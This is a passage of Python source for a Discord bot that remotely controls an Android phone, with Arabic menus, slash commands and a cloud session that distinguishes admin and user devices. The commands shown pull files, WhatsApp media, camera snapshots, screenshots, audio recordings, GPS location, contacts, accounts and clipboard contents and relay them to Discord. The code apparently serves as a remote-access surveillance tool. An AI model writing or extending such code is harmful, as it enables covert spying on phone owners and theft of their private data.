        except Exception as e:
            await interaction.followup.send(f"تعذر: {e}")
        finally:
            if compressed != fp and os.path.exists(compressed):
                try:
                    os.remove(compressed)
                except Exception:
                    pass
    bulk_state['resume_dir'] = None
    bulk_state['resume_index'] = 0
    await interaction.followup.send(f"✅ انتهى ({sent} صورة).")


async def _find_files(name_query, roots, max_results=20, max_depth=8,
                       use_regex=False):
    results = []
    skip_dirs = {"Android", ".thumbnails", "cache", ".cache",
                 "node_modules", ".git"}
    pattern = None
    if use_regex:
        try:
            pattern = re.compile(name_query, re.IGNORECASE)
        except re.error:
            pattern = None
    query = name_query.lower()

    for root in roots:
        if not os.path.isdir(root):
            continue
        try:
            for dirpath, dirnames, filenames in os.walk(root):
                depth = dirpath[len(root):].count(os.sep)
                if depth >= max_depth:
                    dirnames[:] = []
                    continue
                dirnames[:] = [d for d in dirnames
                               if d not in skip_dirs
                               and not d.startswith('.')]
                for fn in filenames:
                    match = (bool(pattern.search(fn)) if pattern
                             else (query in fn.lower()))
                    if match:
                        results.append(os.path.join(dirpath, fn))
                        if len(results) >= max_results:
                            return results
        except Exception:
            continue
    return results


class FindResultsView(discord.ui.View):
    def __init__(self, results, query):
        super().__init__(timeout=900)
        self.results = results
        options = []
        for p in results[:25]:
            name = os.path.basename(p)
            label = f"{_get_icon(name)} {name}"[:80]
            parent = os.path.basename(os.path.dirname(p))[:30]
            options.append(discord.SelectOption(
                label=label,
                value=short_key(p),
                description=f"📁 {parent}"[:100]
            ))
        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ملفًا من {len(results)}",
                options=options, min_values=1, max_values=1)
            select.callback = self._cb
            self.add_item(select)

    async def _cb(self, interaction: discord.Interaction):
        if not _check(interaction):
            await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
            return
        key = interaction.data.get("values", [""])[0]
        path = resolve_key(key)
        if not path or not os.path.isfile(path):
            await _safe_reply(interaction, "❌ ملف غير موجود", ephemeral=True)
            return
        await interaction.response.defer()
        await _send_any_file(interaction, path)


# ═══════════════════════════════════════════════════════════════════
#                       Open Browser Helper
# ═══════════════════════════════════════════════════════════════════
async def _open_browser(interaction, path: str):
    if not is_path_allowed(path):
        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`",
                          ephemeral=True)
        return
    if not os.path.isdir(path):
        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`",
                          ephemeral=True)
        return

    if _ADVANCED_BROWSER:
        state = BrowseState(path=path)
        view = AdvancedFileBrowserView(
            state=state,
            root=ALLOWED_ROOT,
            allowed_roots=DISCOVERED_ROOTS,
            is_allowed_fn=is_path_allowed,
            check_user_fn=_check,
            device_name=DEVICE_NAME,
        )
        await interaction.response.send_message(
            view.build_title(), view=view)
    else:
        view = SimpleFileBrowserView(path, 0)
        await _safe_reply(interaction, view.title(), view=view)


# ═══════════════════════════════════════════════════════════════════
#                       Interactive Main Menu
# ═══════════════════════════════════════════════════════════════════
class MainMenuView(discord.ui.View):
    """القائمة الرئيسية التفاعلية — 3 صفوف × 3 أزرار + تحديث."""

    def __init__(self):
        super().__init__(timeout=600)

    # ═══ Row 0: Files / Media / Device ═══
    @discord.ui.button(label="📁 الملفات", style=discord.ButtonStyle.primary, row=0)
    async def btn_files(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        await _send_category_menu(interaction, "files")

    @discord.ui.button(label="📸 الوسائط", style=discord.ButtonStyle.primary, row=0)
    async def btn_media(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        await _send_category_menu(interaction, "media")

    @discord.ui.button(label="💻 الجهاز", style=discord.ButtonStyle.primary, row=0)
    async def btn_device(self, interaction: discord.Interaction,
                         button: discord.ui.Button):
        await _send_category_menu(interaction, "device")

    # ═══ Row 1: Contacts / Location / Audio ═══
    @discord.ui.button(label="👥 الاتصالات", style=discord.ButtonStyle.success, row=1)
    async def btn_contacts(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        await _send_category_menu(interaction, "contacts")

    @discord.ui.button(label="📍 الموقع", style=discord.ButtonStyle.success, row=1)
    async def btn_location(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        await _send_category_menu(interaction, "location")

    @discord.ui.button(label="🎤 الصوت", style=discord.ButtonStyle.success, row=1)
    async def btn_audio(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        await _send_category_menu(interaction, "audio")

    # ═══ Row 2: Apps / Sensors / Accounts ═══
    @discord.ui.button(label="📱 التطبيقات", style=discord.ButtonStyle.danger, row=2)
    async def btn_apps(self, interaction: discord.Interaction,
                       button: discord.ui.Button):
        await _send_category_menu(interaction, "apps")

    @discord.ui.button(label="❤️ المستشعرات", style=discord.ButtonStyle.danger, row=2)
    async def btn_sensors(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        await _send_category_menu(interaction, "sensors")

    @discord.ui.button(label="🔑 الحسابات", style=discord.ButtonStyle.danger, row=2)
    async def btn_accounts(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        await _send_category_menu(interaction, "accounts")

    # ═══ Row 3: Cloud / Refresh ═══
    @discord.ui.button(label="☁️ السحابة", style=discord.ButtonStyle.secondary, row=3)
    async def btn_cloud(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        await _send_category_menu(interaction, "cloud")

    @discord.ui.button(label="🔄 تحديث", style=discord.ButtonStyle.secondary, row=3)
    async def btn_refresh(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        try:
            embed = await _build_start_embed()
            await interaction.response.edit_message(embed=embed)
        except Exception:
            await interaction.response.defer()


# ═══════════════════════════════════════════════════════════════════
#                       Category Menus
# ═══════════════════════════════════════════════════════════════════
_CATEGORY_DATA = {
    "files": {
        "title": "📁 الملفات",
        "color": Colors.FILES,
        "commands": [
            ("`/browse`", "تصفح حر"),
            ("`/storage`", "التخزين الرئيسي"),
            ("`/tree`", "شجرة مجلد"),
            ("`/search`", "بحث متقدم"),
            ("`/find`", "بحث سريع"),
            ("`/get`", "سحب ملف"),
            ("`/zip`", "ضغط مجلد"),
            ("`/latest`", "آخر الصور"),
            ("`/favorites`", "المفضلة"),
            ("`/roots`", "جذور التخزين"),
            ("`/save`", "حفظ في المفضلة"),
            ("`/upload`", "معلومات الرفع"),
        ],
    },
    "media": {
        "title": "📸 الوسائط",
        "color": Colors.MEDIA,
        "commands": [
            ("`/camera`", "مجلد الكاميرا"),
            ("`/screenshots`", "اللقطات"),
            ("`/downloads`", "التنزيلات"),
            ("`/documents`", "المستندات"),
            ("`/whatsapp_media`", "وسائط واتساب"),
            ("`/snap_back`", "صورة خلفية"),
            ("`/snap_front`", "صورة أمامية"),
            ("`/screenshot`", "لقطة شاشة"),
            ("`/camera_app`", "افتح الكاميرا"),
            ("`/pull_camera`", "سحب آخر صور"),
            ("`/pull_screens`", "سحب آخر لقطات"),
        ],
    },
    "device": {
        "title": "💻 الجهاز",
        "color": Colors.DEVICE,
        "commands": [
            ("`/sysinfo`", "معلومات النظام"),
            ("`/health`", "فحص الصحة"),
            ("`/battery`", "البطارية"),
            ("`/phoneinfo`", "معلومات الهاتف"),
            ("`/storage_test`", "اختبار التخزين"),
            ("`/ip`", "عنوان IP"),
            ("`/clipboard`", "الحافظة"),
            ("`/toast`", "رسالة على الشاشة"),
            ("`/rescan`", "إعادة اكتشاف الجذور"),
            ("`/setroot`", "تعيين جذر"),
        ],
    },
    "contacts": {
        "title": "👥 الاتصالات",
        "color": Colors.CONTACTS,
        "commands": [
            ("`/contacts`", "جهات الاتصال"),
            ("`/wa`", "محادثة واتساب"),
            ("`/wa_home`", "فتح واتساب"),
            ("`/dial`", "لوحة الاتصال"),
        ],
    },
    "location": {
        "title": "📍 الموقع",
        "color": Colors.LOCATION,
        "commands": [
            ("`/gps`", "الموقع الحالي"),
            ("`/gps_providers`", "مزودو الموقع"),
            ("`/ip`", "عنوان IP العام"),
        ],
    },
    "audio": {
        "title": "🎤 الصوت",
        "color": Colors.AUDIO,
        "commands": [
            ("`/record`", "بدء تسجيل"),
            ("`/record_stop`", "إيقاف وإرسال"),
            ("`/record_pause`", "إيقاف مؤقت"),
            ("`/record_resume`", "استئناف"),
            ("`/record_status`", "الحالة"),
            ("`/record_history`", "السجل"),
            ("`/record_stats`", "الإحصائيات"),
            ("`/record_cleanup`", "تنظيف"),
            ("`/record_amplitude`", "مستوى الصوت"),
        ],
    },
    "apps": {
        "title": "📱 التطبيقات",
        "color": Colors.APPS,
        "commands": [
            ("`/openapp`", "فتح تطبيق"),
            ("`/apps`", "قائمة التطبيقات"),
            ("`/openurl`", "فتح رابط"),
            ("`/open`", "فتح ملف"),
        ],
    },
    "sensors": {
        "title": "❤️ المستشعرات",
        "color": Colors.SENSORS,
        "commands": [
            ("`/sensors`", "كل المستشعرات"),
            ("`/heartbeat`", "نبضات القلب"),
            ("`/steps`", "عدد الخطوات"),
            ("`/accelerometer`", "التسارع"),
            ("`/gyroscope`", "الجيروسكوب"),
        ],
    },
    "accounts": {
        "title": "🔑 الحسابات",
        "color": Colors.ACCOUNTS,
        "commands": [
            ("`/accounts`", "كل الحسابات"),
            ("`/accounts_stats`", "إحصائيات"),
            ("`/accounts_grouped`", "مجمّعة حسب الفئة"),
        ],
    },
    "cloud": {
        "title": "☁️ السحابة",
        "color": Colors.CLOUD,
        "commands": [
            ("`/cloud`", "حالة السحابة"),
            ("`/session_info`", "حالة الجلسة"),
            ("`/my_role`", "دور هذا الجهاز"),
            ("`/cloud_audit`", "آخر الأوامر المسجّلة"),
        ],
    },
}


async def _send_category_menu(interaction: discord.Interaction, cat: str):
    data = _CATEGORY_DATA.get(cat)
    if not data:
        await interaction.response.defer()
        return

    lines = []
    for cmd, desc in data["commands"]:
        lines.append(f"• {cmd} — {desc}")

    embed = _make_embed(
        data["title"],
        "\n".join(lines),
        data["color"],
    )
    try:
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception:
        try:
            await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
#                       Build Start Embed
# ═══════════════════════════════════════════════════════════════════
async def _build_start_embed() -> discord.Embed:
    perms = {}
    if _bridge_ready():
        try:
            perms_raw = await asyncio.to_thread(
                _bridge.get_permissions_json)
            perms = json.loads(perms_raw) if perms_raw else {}
        except Exception as e:
            log.error(f"permissions: {e}")

    def mark(key):
        return "✅" if perms.get(key, False) else "❌"

    keys = ['all_files', 'camera', 'record_audio', 'contacts',
            'fine_location', 'read_call_log', 'read_phone_state',
            'call_phone', 'accounts', 'activity_recognition',
            'body_sensors']
    granted = sum(1 for k in keys if perms.get(k, False))
    total = len(keys)
    pct = int((granted / total) * 100) if total > 0 else 0

    android_ver = perms.get('android', ANDROID.release or '?')
    sdk_ver = perms.get('sdk', ANDROID.sdk or '?')

    # Cloud status
    cloud_status = "غير متاح"
    session_status = "?"
    is_active = False
    if _cloud_ready():
        try:
            status = _cloud.get_status()
            cloud_status = "✅ متصل" if status.get("ready") else "⚠️ غير مهيأ"
            session_info = _cloud.get_session_status()
            if isinstance(session_info, dict):
                session_status = session_info.get("status", "?")
            is_active = _cloud.is_my_session_active()
        except Exception:
            pass

    embed = discord.Embed(
        title=f"🤖 {BOT_TITLE} v{VERSION}",
        description=(
            f"*{VERSION_NAME}*\n\n"
            f"**💫 لوحة التحكم الرئيسية**\n"
            f"اختر فئة من الأزرار أدناه."
        ),
        color=Colors.PRIMARY,
        timestamp=discord.utils.utcnow(),
    )

    embed.add_field(
        name="📱 الجهاز",
        value=(
            f"🖥️ `{DEVICE_NAME}`\n"
            f"🤖 Android `{android_ver}` (SDK `{sdk_ver}`)\n"
            f"🏭 `{ANDROID.vendor_name}`"
        ),
        inline=True,
    )

    embed.add_field(
        name="📊 الصلاحيات",
        value=(
            f"**{granted}/{total}** ({pct}%)\n"
            f"{mark('all_files')}📁 {mark('camera')}📷 "
            f"{mark('record_audio')}🎤\n"
            f"{mark('contacts')}👥 {mark('fine_location')}📍 "
            f"{mark('call_phone')}📞"
        ),
        inline=True,
    )

    embed.add_field(
        name="☁️ السحابة",
        value=(
            f"**الحالة:** {cloud_status}\n"
            f"**الجلسة:** `{session_status}`\n"
            f"**نشط:** {'✅' if is_active else '❌'}"
        ),
        inline=True,
    )

    embed.add_field(
        name="✨ الميزات",
        value=(
            f"• FileBrowser: {'✅ v2.0' if _ADVANCED_BROWSER else '⚠️ v1.0'}\n"
            f"• AudioRecorder: ✅ v4.0\n"
            f"• AccountsHelper: ✅ v3.0\n"
            f"• Cloud Agent: {'✅' if _CLOUD_AVAILABLE else '❌'}"
        ),
        inline=False,
    )

    embed.set_footer(text=f"Moayed • {len(bot.guilds)} سيرفر • "
                          f"v{VERSION}")
    return embed


# ═══════════════════════════════════════════════════════════════════
#                       Events
# ═══════════════════════════════════════════════════════════════════
_ready_called = {"value": False}
_synced_once = {"value": False}


@bot_event("on_ready")
async def on_ready():
    if _ready_called["value"]:
        return
    _ready_called["value"] = True

    STATE.mark_running()
    log.info(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    log.info(f"✅ Connected to {len(bot.guilds)} guild(s)")
    log.info(f"🌉 bridge.py: {'✅' if _BRIDGE_AVAILABLE else '❌'}")
    log.info(f"☁️ cloud_agent.py: {'✅' if _CLOUD_AVAILABLE else '❌'}")
    log.info(f"📂 file_browser.py: {'✅' if _ADVANCED_BROWSER else '❌'}")

    try:
        ANDROID.load()
    except Exception as e:
        log.warning(f"AndroidVersion load failed: {e}")

    # 🆕 v8.0: Report to cloud
    if _cloud_ready():
        try:
            _cloud.report_bot_running(True)
            STATE.cloud_reported = True
            log.info("☁️ Reported bot_running=True")
        except Exception as e:
            log.warning(f"cloud report failed: {e}")

    if _synced_once["value"]:
        return
    try:
        with STATE._lock:
            guild_id = STATE.guild_id

        if guild_id:
            guild = discord.Object(id=guild_id)
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
        else:
            synced = await bot.tree.sync()
        log.info(f"✅ Synced {len(synced)} slash commands")
        _synced_once["value"] = True
    except Exception as e:
        log.error(f"❌ Sync error: {e}")

    try:
        await bot.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=f"📱 {BOT_TITLE} | /start"),
            status=discord.Status.online,
        )
    except Exception as e:
        log.warning(f"Presence error: {e}")

    log.info(f"🎉 البوت جاهز — {VERSION_NAME}")


@bot_event("on_disconnect")
async def on_disconnect():
    log.warning("⚠️ Disconnected from Discord")


@bot_event("on_resumed")
async def on_resumed():
    log.info("🔄 Session resumed")


@bot_event("on_error")
async def on_error(event_method, *args, **kwargs):
    log.error(f"⚠️ Unhandled error in {event_method}")
    try:
        print(traceback.format_exc(), flush=True)
    except Exception:
        pass


@bot_event("on_message")
async def on_message(message):
    allowed = STATE.get_allowed_id()
    if allowed is None or message.author.id != allowed:
        await bot.process_commands(message)
        return

    if not message.attachments:
        await bot.process_commands(message)
        return

    saved = []
    for att in message.attachments:
        try:
            safe_name = re.sub(r'[^\w\-_. ]', '_', att.filename)[:200]
            dest = os.path.join(UPLOAD_DIR, safe_name)
            base, ext = os.path.splitext(dest)
            i = 1
            while os.path.exists(dest):
                dest = f"{base}_{i}{ext}"
                i += 1
            await att.save(dest)
            saved.append(os.path.basename(dest))
        except Exception as e:
            log.error(f"upload save failed: {e}")

    if saved:
        try:
            await message.reply(
                f"📥 حُفظ {len(saved)} ملف في `{UPLOAD_DIR}`:\n" +
                "\n".join(f"• `{n}`" for n in saved),
                mention_author=False
            )
        except Exception:
            pass

    await bot.process_commands(message)


# ═══════════════════════════════════════════════════════════════════
#                       /start
# ═══════════════════════════════════════════════════════════════════
@bot_command("start", "🏠 القائمة الرئيسية")
@require_allowed
@with_stats("start")
async def start_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    embed = await _build_start_embed()
    view = MainMenuView()
    await interaction.followup.send(embed=embed, view=view)


# ═══════════════════════════════════════════════════════════════════
#                       Core Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("ping", "🏓 اختبار سرعة الاستجابة")
@require_allowed
@with_stats("ping")
async def ping_cmd(interaction: discord.Interaction):
    start = time.time()
    await interaction.response.send_message("🏓 Pong!")
    latency = (time.time() - start) * 1000
    embed = _make_embed(
        "🏓 Pong!",
        f"⚡ **البوت:** `{latency:.1f}ms`\n"
        f"🟢 **Discord:** `{bot.latency * 1000:.1f}ms`",
        Colors.SUCCESS,
    )
    await interaction.edit_original_response(content=None, embed=embed)


@bot_command("stats", "📊 إحصائيات الاستخدام")
@require_allowed
@with_stats("stats")
async def stats_cmd(interaction: discord.Interaction):
    s = STATS.to_dict()
    top = "\n".join(
        f"`{name}`: {count}" for name, count in s["top_commands"]
    ) or "—"
    errors = "\n".join(
        f"`{name}`: {count}" for name, count in s["errors"].items()
    ) or "لا شيء"

    embed = _make_embed("📊 إحصائيات البوت", color=Colors.PRIMARY)
    embed.add_field(name="⏱️ الوقت",
                    value=f"`{s['uptime_human']}`", inline=True)
    embed.add_field(name="📁 ملفات",
                    value=f"**{s['files_sent']}**", inline=True)
    embed.add_field(name="💾 حجم",
                    value=f"`{s['bytes_sent_human']}`", inline=True)
    embed.add_field(name="🎯 الأوامر",
                    value=f"**{s['total_commands']}**", inline=True)
    embed.add_field(name="🏆 الأكثر استخدامًا",
                    value=top[:1024] or "—", inline=False)
    embed.add_field(name="⚠️ الأخطاء",
                    value=errors[:1024], inline=False)
    await interaction.response.send_message(embed=embed)


@bot_command("whoami", "👤 معلومات عنك")
@require_allowed
@with_stats("whoami")
async def whoami_cmd(interaction: discord.Interaction):
    user = interaction.user
    created = user.created_at.strftime("%Y-%m-%d")
    embed = _make_embed(
        f"👤 {user.name}",
        f"🆔 `{user.id}`\n"
        f"📅 منذ: `{created}`\n"
        f"✅ مصرّح",
        Colors.INFO,
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot_command("health", "🏥 فحص صحة البوت")
@require_allowed
@with_stats("health")
async def health_cmd(interaction: discord.Interaction):
    with STATE._lock:
        uptime_sec = (int(time.time() - STATE.start_time)
                      if STATE.start_time else 0)
        is_running = STATE.is_running
        last_error = STATE.last_error
        owner = STATE.owner_id
        device_id = STATE.device_id

    cloud_info = "غير متاح"
    if _cloud_ready():
        try:
            status = _cloud.get_status()
            cloud_info = "✅" if status.get("ready") else "⚠️"
        except Exception:
            pass

    embed = _make_embed("🏥 Health Report", color=Colors.INFO)
    embed.add_field(
        name="🤖 البوت",
        value=(
            f"• النسخة: `{VERSION}`\n"
            f"• التشغيل: `{uptime_sec}s`\n"
            f"• Latency: `{round(bot.latency * 1000)}ms`\n"
            f"• السيرفرات: `{len(bot.guilds)}`"
        ),
        inline=True,
    )
    embed.add_field(
        name="📱 Android",
        value=(
            f"• الإصدار: `{ANDROID.release}`\n"
            f"• SDK: `{ANDROID.sdk}`\n"
            f"• المُصنّع: `{ANDROID.vendor_name}`"
        ),
        inline=True,
    )
    embed.add_field(
        name="🔌 المكونات",
        value=(
            f"• Bridge: {'✅' if _BRIDGE_AVAILABLE else '❌'}\n"
            f"• Cloud: {cloud_info}\n"
            f"• Browser: {'✅' if _ADVANCED_BROWSER else '⚠️'}\n"
            f"• Contacts: {'✅' if _is_contacts_ready() else '❌'}\n"
            f"• PIL: {'✅' if HAS_PIL else '❌'}"
        ),
        inline=False,
    )
    if device_id:
        embed.add_field(
            name="🆔 الجهاز",
            value=f"`{device_id[:8]}...`",
            inline=True,
        )
    if last_error:
        embed.add_field(
            name="⚠️ آخر خطأ",
            value=f"`{last_error[:200]}`",
            inline=False,
        )
    await interaction.response.send_message(embed=embed)


@bot_command("clearcache", "🧹 مسح الذاكرة المؤقتة")
@require_allowed
@with_stats("clearcache")
async def clearcache_cmd(interaction: discord.Interaction):
    size_before = LIST_CACHE.size()
    LIST_CACHE.clear()
    RATE_LIMITER.reset(interaction.user.id)
    embed = _make_embed(
        "🧹 تم المسح",
        f"• Cache: `{size_before}` → `0`\n"
        f"• Rate Limiter: مُعاد تعيينه",
        Colors.SUCCESS,
    )
    await interaction.response.send_message(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Cloud Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("cloud", "☁️ حالة السحابة والجلسة")
@require_allowed
@with_stats("cloud")
async def cloud_cmd(interaction: discord.Interaction):
    if not _cloud_ready():
        await interaction.response.send_message(
            embed=_make_error_embed("Cloud Agent غير متاح"),
            ephemeral=True,
        )
        return

    try:
        status = _cloud.get_status()
        session = _cloud.get_session_status()
        is_active = _cloud.is_my_session_active()
    except Exception as e:
        await interaction.response.send_message(
            embed=_make_error_embed(str(e)),
            ephemeral=True,
        )
        return

    embed = _make_embed("☁️ حالة السحابة", color=Colors.CLOUD)
    embed.add_field(
        name="📡 الاتصال",
        value=(
            f"• الحالة: {'✅ متصل' if status.get('ready') else '❌'}\n"
            f"• الجهاز: `{status.get('device_id', '?')}`\n"
            f"• Gen: `{status.get('generation', 0)}`"
        ),
        inline=True,
    )
    if isinstance(session, dict):
        embed.add_field(
            name="🔗 الجلسة",
            value=(
                f"• الحالة: `{session.get('status', '?')}`\n"
                f"• أنا النشط: {'✅' if is_active else '❌'}\n"
                f"• Health: `{session.get('health_score', '?')}`"
            ),
            inline=True,
        )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot_command("session_info", "🔗 معلومات bot_session")
@require_allowed
@require_cloud
@with_stats("session_info")
async def session_info_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        session = _cloud.get_session_status()
        is_active = _cloud.is_my_session_active()
    except Exception as e:
        await interaction.followup.send(
            embed=_make_error_embed(str(e)), ephemeral=True)
        return

    if not isinstance(session, dict):
        await interaction.followup.send(
            embed=_make_warning_embed("لا توجد جلسة نشطة"),
            ephemeral=True)
        return

    embed = _make_embed("🔗 bot_session", color=Colors.CLOUD)
    for key, label in [
        ("status", "الحالة"),
        ("user_device_id", "User Device"),
        ("admin_device_id", "Admin Device"),
        ("health_score", "Health Score"),
        ("has_token", "التوكن موجود"),
        ("is_running", "يعمل"),
        ("is_active", "هذا الجهاز"),
    ]:
        val = session.get(key, "?")
        if isinstance(val, str) and len(val) > 12:
            val = val[:8] + "..."
        embed.add_field(name=label, value=f"`{val}`", inline=True)
    embed.add_field(
        name="🎯 أنا النشط",
        value="✅" if is_active else "❌",
        inline=False,
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot_command("my_role", "🎭 دور هذا الجهاز")
@require_allowed
@with_stats("my_role")
async def my_role_cmd(interaction: discord.Interaction):
    role = "غير معروف"
    device_id = STATE.device_id or "—"

    try:
        from java import jclass
        DeviceIdentity = jclass(
            "com.example.myfirstapp.cloud.core.DeviceIdentity")
        identity = DeviceIdentity.get(STATE.context)
        r = str(identity.getRole())
        if r == "admin":
            role = "👑 Admin"
        elif r == "user":
            role = "👤 User"
        else:
            role = f"`{r}`"
    except Exception as e:
        role = f"خطأ: {str(e)[:50]}"

    embed = _make_embed(
        "🎭 دور الجهاز",
        f"**الدور:** {role}\n"
        f"**Device ID:** `{device_id[:12] + '...' if len(device_id) > 12 else device_id}`",
        Colors.CLOUD,
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot_command("cloud_audit", "📜 آخر الأوامر المسجّلة في السحابة")
@require_allowed
@require_cloud
@with_stats("cloud_audit")
async def cloud_audit_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    try:
        from java import jclass
        Repo = jclass(
            "com.example.myfirstapp.cloud.repos.CloudCommandRepository")
        repo = Repo(STATE.context)
        device_id = STATE.device_id
        commands_list = repo.fetchRecentFor(device_id, 10)
    except Exception as e:
        await interaction.followup.send(
            embed=_make_error_embed(f"تعذر الاتصال: {e}"),
            ephemeral=True)
        return

    if not commands_list:
        await interaction.followup.send(
            embed=_make_warning_embed("لا توجد أوامر مسجّلة"),
            ephemeral=True)
        return

    lines = []
    for i, cmd in enumerate(commands_list[:10], 1):
        try:
            action = str(cmd.action)
            status = str(cmd.status)
            icon = {"done": "✅", "failed": "❌",
                    "pending": "⏳"}.get(status, "❔")
            lines.append(f"`{i}.` {icon} `{action}` — {status}")
        except Exception:
            continue

    embed = _make_embed(
        "📜 آخر الأوامر",
        "\n".join(lines),
        Colors.CLOUD,
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════════════════════════════
#                       Files Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("browse", "📂 تصفح حر لأي مسار")
@app_commands.describe(path="المسار (افتراضي: الجذر)")
@require_allowed
@with_stats("browse")
async def browse_cmd(interaction: discord.Interaction, path: str = None):
    target = path or ALLOWED_ROOT
    await _open_browser(interaction, target)


@bot_command("storage", "📁 التخزين الرئيسي")
@require_allowed
@with_stats("storage")
async def storage_cmd(interaction: discord.Interaction):
    await _open_browser(interaction, ALLOWED_ROOT)


@bot_command("camera", "📸 مجلد الكاميرا")
@require_allowed
@with_stats("camera")
async def camera_cmd(interaction: discord.Interaction):
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد الكاميرا.",
                          ephemeral=True)
        return
    await _open_browser(interaction, path)


@bot_command("screenshots", "🖼️ لقطات الشاشة")
@require_allowed
@with_stats("screenshots")
async def screenshots_cmd(interaction: discord.Interaction):
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد اللقطات.",
                          ephemeral=True)
        return
    await _open_browser(interaction, path)


@bot_command("downloads", "📥 التنزيلات")
@require_allowed
@with_stats("downloads")
async def downloads_cmd(interaction: discord.Interaction):
    path = _find_dir_in_roots(DOWNLOAD_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد التنزيلات.",
                          ephemeral=True)
        return
    await _open_browser(interaction, path)


@bot_command("documents", "📄 المستندات")
@require_allowed
@with_stats("documents")
async def documents_cmd(interaction: discord.Interaction):
    path = _find_dir_in_roots(DOCUMENT_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد المستندات.",
                          ephemeral=True)
        return
    await _open_browser(interaction, path)


@bot_command("whatsapp_media", "💬 وسائط واتساب")
@require_allowed
@with_stats("whatsapp_media")
async def whatsapp_media_cmd(interaction: discord.Interaction):
    path = _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد وسائط واتساب.",
                          ephemeral=True)
        return
    await _open_browser(interaction, path)


@bot_command("tree", "🌳 شجرة مجلد")
@app_commands.describe(path="المسار", depth="العمق (1-5)")
@require_allowed
@with_stats("tree")
async def tree_cmd(interaction: discord.Interaction, path: str = None,
                   depth: int = 3):
    target = path or ALLOWED_ROOT
    if not is_path_allowed(target) or not os.path.isdir(target):
        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
        return
    depth = max(1, min(5, depth))
    await interaction.response.defer()
    lines = [f"🌳 `{target}` (عمق {depth})\n"]
    lines.extend(_build_tree(target, max_depth=depth))
    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="tree.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        embed = _make_embed(
            f"🌳 `{target}`",
            f"```\n{text[:1900]}\n```",
            Colors.FILES,
        )
        await interaction.followup.send(embed=embed)


@bot_command("search", "🔎 بحث متقدم")
@app_commands.describe(name="الاسم أو Regex", regex="استخدام Regex؟",
                        limit="الحد (1-25)")
@require_allowed
@with_stats("search")
async def search_cmd(interaction: discord.Interaction, name: str,
                     regex: bool = False, limit: int = 20):
    limit = max(1, min(25, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS,
                                     max_results=limit, max_depth=8,
                                     use_regex=regex)
    except Exception as e:
        STATS.record_error("search")
        await _safe_reply(interaction, f"❌ {e}")
        return
    if not results:
        await _safe_reply(interaction, f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    embed = _make_embed(
        f"🔎 {len(results)} نتيجة",
        f"**البحث:** `{name}`" + (" (Regex)" if regex else ""),
        Colors.FILES,
    )
    await interaction.followup.send(embed=embed, view=view)


@bot_command("find", "🔍 بحث سريع")
@app_commands.describe(name="جزء من الاسم", limit="الحد (1-20)")
@require_allowed
@with_stats("find")
async def find_cmd(interaction: discord.Interaction, name: str,
                    limit: int = 15):
    limit = max(1, min(20, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS,
                                     max_results=limit, max_depth=6)
    except Exception as e:
        STATS.record_error("find")
        await _safe_reply(interaction, f"❌ {e}")
        return
    if not results:
        await _safe_reply(interaction, f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    embed = _make_embed(
        f"🔍 {len(results)} نتيجة",
        f"**البحث:** `{name}`",
        Colors.FILES,
    )
    await interaction.followup.send(embed=embed, view=view)


@bot_command("get", "📄 سحب ملف")
@app_commands.describe(path="المسار")
@require_allowed
@with_stats("get")
async def get_cmd(interaction: discord.Interaction, path: str):
    await interaction.response.defer()
    await _send_any_file(interaction, path)


@bot_command("zip", "🗜️ ضغط مجلد")
@app_commands.describe(path="المسار")
@require_allowed
@with_stats("zip")
async def zip_cmd(interaction: discord.Interaction, path: str):
    await interaction.response.defer()
    await _send_zip_of_dir(interaction, path)


@bot_command("latest", "🆕 آخر الصور")
@app_commands.describe(folder="المجلد", count="العدد (1-10)")
@require_allowed
@with_stats("latest")
async def latest_cmd(interaction: discord.Interaction, folder: str = None,
